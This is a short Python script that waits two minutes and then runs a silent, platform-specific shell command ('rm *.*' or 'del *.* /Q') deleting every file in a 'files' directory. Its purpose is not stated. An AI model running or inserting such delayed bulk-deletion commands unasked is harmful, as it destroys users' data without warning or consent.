import time
import os
import sys
from sys import platform
time.sleep(120)
linuxthing = """cd files
rm *.*"""
windowsthing = """@echo off
cd files
del *.* /Q"""
def is_windows():
	return platform == "win32"
if is_windows():
	os.system(windowsthing)
else:
	os.system(linuxthing)